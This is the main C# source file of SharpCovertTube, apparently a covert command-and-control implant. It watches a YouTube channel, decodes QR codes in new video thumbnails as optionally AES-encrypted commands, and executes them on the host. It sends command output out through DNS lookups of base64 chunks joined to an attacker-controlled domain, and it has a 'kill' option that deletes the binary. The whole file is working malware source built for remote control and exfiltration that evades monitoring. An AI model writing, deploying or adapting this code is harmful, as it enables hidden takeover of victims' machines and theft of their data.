using System;
using System.Net;
using System.Linq;
using System.Text;
using System.Drawing;
using System.Collections.Generic;
using SharpCovertTube.QRCodeDecoder;
using static SharpCovertTube.Configuration;
using static SharpCovertTube.CmdFunctions;
using static SharpCovertTube.HelperFunctions;
using static SharpCovertTube.Win32;


namespace SharpCovertTube
{
    internal class Program
    {
        // Exfiltrate data via DNS
        static void DNSExfil(string response_cmd) {
            // Base64-encode the response
            if (response_cmd == "")
            {
                response_cmd = "null";
            }
            string base64_response_cmd = Base64Encode(response_cmd);
            LogShow("Base64-encoded response:\t\t"+ base64_response_cmd);
            int max_size = 100; // 255 - dns_hostname.Length - 1;
            if (base64_response_cmd.Length > max_size) {
                LogShow("Splitting encoded response in chunks of "+ max_size + " characters");
            }
            var parts = SplitInParts(base64_response_cmd, max_size);
            foreach (var response_portion in parts)
            {
                // DNS lookup
                try
                {
                    string exfil_hostname = response_portion + dns_hostname;
                    exfil_hostname = exfil_hostname.Replace("=", "");
                    LogShow("DNS lookup against:\t\t\t" + exfil_hostname);
                    Dns.GetHostAddresses(exfil_hostname);
                }
                catch (Exception e)
                {
                    if (e.GetType().ToString() != "System.Net.Sockets.SocketException")
                    {
                        LogShow("[-] Exception: " + e.ToString());
                    }
                }
            }
        }


        // Get cleartext QR-decoded value and delete binary and stop the process (option "kill") or execute the command
        static string ExecuteCommand(string command)
        {
            if (command == "kill")
            {
                DeleteAndKill();
                return "";
            }
            else
            {
                string output = OrdinaryCmd(command);
                return output;
            }
        }


        // Check if value is AES-decryptable and decrypt if it is
        static string TryDecrypt(string payload)
        {
            try {
                string base64_decoded = Base64Decode(payload);
                string decrypted_cmd = DecryptStringFromBytes(base64_decoded, Encoding.ASCII.GetBytes(payload_aes_key), Encoding.ASCII.GetBytes(payload_aes_iv));
                LogShow("Payload was AES-encrypted");
                return decrypted_cmd;
            }
            catch {
                LogShow("Payload was not AES-encrypted");
                return payload;
            }
        }


        // Receive a QR image as Bitmap, read the value and return it as string. Source: https://github.com/Stefangansevles/QR-Capture
        static string DecodeQR(Bitmap QRCodeInputImage)
        {
            QRDecoder decoder = new QRDecoder();
            byte[][] DataByteArray = decoder.ImageDecoder(QRCodeInputImage);
            if (DataByteArray == null)
            {
                Console.WriteLine("DataByteArray is null");
                return "";
            }
            string code = ByteArrayToStr(DataByteArray[0]);
            return code;
        }


        // Read the QR image as Bitmap from the Youtube thumbnail URL and return the value as string
        static string ReadQR(string thumbnail_url)
        {
            var client = new WebClient();
            var stream = client.OpenRead(thumbnail_url);
            if (stream == null) return "";
            Bitmap bitmap_from_image = new Bitmap(stream);
            string decoded_cmd = DecodeQR(bitmap_from_image);
            return decoded_cmd;
        }


        // Get the video's thumbnail url, read the QR code value in it, decrypt it and execute the command. If enabled, exfiltrate the response using DNS
        static void ReadVideo(string video_id, string channel_url)
        {
            LogShow("Reading new video with ID: \t\t" + video_id);
            string thumbnail_url = "https://i.ytimg.com/vi/" + video_id + "/hqdefault.jpg";
            
            // Read QR
            string qr_decoded_cmd = ReadQR(thumbnail_url);
            LogShow("Value decoded from QR:\t\t" + qr_decoded_cmd);

            // Decrypt in case it is AES-encrypted
            string decrypted_cmd = TryDecrypt(qr_decoded_cmd);
            LogShow("Value after trying to AES-decrypt:\t" + decrypted_cmd);

            // Execute command
            string response_cmd = ExecuteCommand(decrypted_cmd);
            response_cmd.Trim();
            LogShow("Response from command:\t\t" + response_cmd);

            // Exfiltrate
            if (dns_exfiltration) {
                DNSExfil(response_cmd);
            }
        }


        // Request the information about the channel URL from the API, parse to JSON using APIInfo.cs and return a List with the videos IDs 
        static List<string> GetVideoIds(string channel_url)
        {
            List<string> VideoIds = new List<string>();
            string json_response_str = getRequest(channel_url);

            var deserialized = JSONSerializer<APIInfo>.DeSerialize(json_response_str);
            foreach (Item item in deserialized.items)
            {
                VideoIds.Add(item.id.videoId);
            }

            return VideoIds;
        }


        // Get initial videos ids, sleep a specific amount of time and check if there are new videos, if so call ReadVideo for each of them
        static void MonitorChannel(string channel_url, int seconds_delay) {
            // Initial videos
            List<string> Initial_VideoIds = GetVideoIds(channel_url);
            int number_of_videos = Initial_VideoIds.Count;
            foreach (string value in Initial_VideoIds)
            {
                LogShow("Video already uploaded with ID " + value);
            }

            while (true)
            {
                // Sleep
                LogShow("Sleeping "+ seconds_delay + " seconds");
                System.Threading.Thread.Sleep(1000 * seconds_delay);

                // Get list of videos
                List<string> VideoIds = GetVideoIds(channel_url);
                var firstNotSecond = VideoIds.Except(Initial_VideoIds);
                // If new videos -> Read
                if (firstNotSecond != null && firstNotSecond.Any()) {
                    LogShow("New video(s) uploaded!");

                    foreach (var video_id in firstNotSecond)
                    {
                        ReadVideo(video_id, channel_url);
                    }

                    number_of_videos = VideoIds.Count;
                    Initial_VideoIds = VideoIds;
                }
                // No new videos
                else
                {
                    LogShow("No new videos... Total number of uploaded videos: \t" + VideoIds.Count);
                }
            }
        }


        // If enabled, write message to console ("debug_console" parameter) or file ("log_to_file" parameter)
        public static void LogShow(string msg)
        {
            msg = "[" + DateTime.Now.ToString("HH:mm:ss").ToString() + "]  " + msg;
            if (debug_console)
            {
                Console.WriteLine(msg);
            }
            if (log_to_file)
            {
                using (System.IO.StreamWriter writer = System.IO.File.AppendText(log_file))
                {
                    writer.WriteLine(msg);
                }
            }
        }


        // Loop to wait 1 minute if there is not internet connection
        public static void WaitForInternetConnection()
        {
            while (InternetGetConnectedState(out _, 0) == false)
            {
                System.Threading.Thread.Sleep(1000 * 60);
            }
        }


        static void Main(string[] args)
        {
            if (channel_id == "" || api_key == "") {
                LogShow("Fill the channel_id and api_key values in Configuration.cs file before running the program.");
                System.Environment.Exit(0);
            }
            WaitForInternetConnection();
            LogShow("Monitoring Youtube channel with id " + channel_id);
            string channel_url = "https://www.googleapis.com/youtube/v3/search?" + "part=snippet&channelId=" + channel_id + "&maxResults=100&order=date&type=video&key=" + api_key;
            MonitorChannel(channel_url, seconds_delay);
        }
    }
}